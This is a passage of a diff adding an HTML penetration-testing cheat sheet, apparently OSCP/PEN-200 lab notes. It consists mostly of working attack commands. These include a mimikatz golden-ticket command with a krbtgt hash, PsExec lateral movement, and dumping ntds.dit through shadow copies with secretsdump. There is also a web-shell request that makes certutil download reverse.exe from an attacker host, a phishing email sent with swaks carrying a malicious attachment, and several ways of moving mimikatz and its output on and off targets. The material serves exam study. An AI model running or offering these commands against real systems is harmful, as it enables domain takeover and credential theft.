+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+mimikatz # misc::cmd</code></pre></div>
+
+<p><code>C:\Tools\SysinternalsSuite&gt;PsExec.exe \\dc1 cmd.exe</code>
+<code>C:\Tools\SysinternalsSuite&gt; psexec.exe \\192.168.50.70 cmd.exe
+</code>
+<!-- TOC --><a name="shadow-copies"></a></p>
+
+<h2 id="toc_72">Shadow Copies</h2>
+
+<blockquote>
+<p>from DC</p>
+</blockquote>
+
+<p><code>C:\Tools&gt;vshadow.exe -nw -p  C:</code>
+<code>C:\Tools&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak</code>
+<code>C:\&gt; reg.exe save hklm\system c:\system.bak</code>
+<code>kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</code></p>
+
+<p><!-- TOC --><a name="miscelanea"></a></p>
+
+<h1 id="toc_73">Miscelanea</h1>
+
+<p><!-- TOC --><a name="linux-spawning-shell"></a></p>
+
+<h2 id="toc_74">Linux spawning shell</h2>
+
+<p><code>$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+
+<p><!-- TOC --><a name="password-spraying"></a></p>
+
+<h2 id="toc_75">Password Spraying</h2>
+
+<p><a href="https://www.netexec.wiki/">https://www.netexec.wiki/</a></p>
+
+<p><!-- TOC --><a name="dump-git-branches"></a></p>
+
+<h2 id="toc_76">Dump git branches</h2>
+
+<p><a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
+
+<p><code>kali@kali:~$ /home/kali/.local/bin/git-dumper http://192.168.202.144/.git/ .</code></p>
+
+<p><!-- TOC --><a name="reverse-shell-using-certutil"></a></p>
+
+<h2 id="toc_77">Reverse shell using certutil</h2>
+
+<p><code>kali@kali:~$ curl -u offsec:elite &quot;http://192.168.212.46:242/shell.php?cmd=certutil+-f+-urlcache+http://192.168.45.248/reverse.exe+reverse.exe&quot;</code></p>
+
+<p><!-- TOC --><a name="send-email"></a></p>
+
+<h2 id="toc_78">Send email</h2>
+
+<p><code>kali@kali:~$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt - -header &quot;Subject: Staging Script&quot; --suppress-data -ap</code></p>
+
+<p><!-- TOC --><a name="transfer-files"></a></p>
+
+<h2 id="toc_79">Transfer files</h2>
+
+<p><!-- TOC --><a name="smb"></a></p>
+
+<h3 id="toc_80">SMB</h3>
+
+<p>On Kali:
+<code>kali@kali:~$ impacket-smbserver test . -smb2support  -username kourosh -password kourosh</code></p>
+
+<p>On Windows:
+<code>C:\&gt; net use m: \\Kali_IP\test /user:kourosh kourosh
+copy mimikatz.log m:\</code></p>
+
+<p><!-- TOC --><a name="rdp-mounting-shared-folder"></a></p>
+
+<h3 id="toc_81">RDP mounting shared folder</h3>
+
+<p>Using xfreerdp:
+On Kali:
+<code>kali@kali:~$ xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-200</code></p>
+
+<p>On windows:
+<code>C:\&gt; copy mimikatz.log \\tsclient\test\mimikatz.log</code></p>
+
+<p><!-- TOC --><a name="using-rdesktop"></a></p>
+
+<h3 id="toc_82">Using rdesktop</h3>
+
+<p>On Kali: 
+<code>kali@kali:~$ rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200</code></p>
+
+<p>On Windows:
+<code>C:\&gt; copy mimikatz.log \\tsclient\test\mimikatz.log</code></p>
+
+<p><!-- TOC --><a name="impacket-tools"></a></p>
+
+<h3 id="toc_83">Impacket tools</h3>
+
+<blockquote>
+<p>psexec and wmiexec are shipped with built in feature for file transfer.
+Note: By default whether you upload (lput) or download (lget) a file, it&#39;ll be writte in C:\Windows path.
+Uploading mimikatz.exe to the target machine:</p>
+</blockquote>
+
+<p><code>C:\Windows\system32&gt; lput mimikatz.exe</code></p>
+
+<div><pre><code class="language-none">[*] Uploading mimikatz.exe to ADMIN$\/</code></pre></div>
+
+<p><code>C:\Windows\system32&gt; cd C:\windows</code>
+<code>C:\Windows&gt; dir /b mimikatz.exe</code></p>
+
+<p>Downloading mimikatz.log:
+<code>C:\Windows&gt; lget mimikatz.log</code></p>
+
+<div><pre><code class="language-none">[*] Downloading ADMIN$\mimikatz.log</code></pre></div>
+
+<p><!-- TOC --><a name="evil-winrm"></a></p>
+
+<h3 id="toc_84">Evil-winrm</h3>
+
+<p>Uploading files:
+<code>upload mimikatz.exe C:\windows\tasks\mimikatz.exe</code></p>
+
+<p>Downloading files:
+<code>download mimikatz.log /home/kali/Documents/pen-200</code></p>
+
+<p><!-- TOC --><a name="c2-frameworks"></a></p>
+
+<h3 id="toc_85">C2 frameworks</h3>
+
+<blockquote>
+<p>Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.</p>
+</blockquote>
+
+<p><!-- TOC --><a name="ftp"></a></p>
+
+<h3 id="toc_86">FTP</h3>
+
+<p>Binaries in ASCII mode will make the file not executable. Set the mode to binary.</p>
+
+
+
+
+</body>
+
+</html>
